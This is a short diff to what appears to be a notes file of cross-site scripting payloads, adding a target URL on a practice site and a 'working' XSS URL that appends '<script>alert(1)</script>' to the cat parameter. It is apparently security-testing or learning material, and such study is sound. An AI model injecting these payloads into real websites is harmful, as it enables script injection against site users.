@@ -22,3 +22,11 @@ payloads
 <script>alert(1)</script>
 ><script>alert(1)</script>
 ```
+
+target url 
+
+```
+http://testphp.vulnweb.com/listproducts.php?cat=1
+```
+
+xss url working : http://testphp.vulnweb.com/listproducts.php?cat=1 ><script>alert(1)</script>
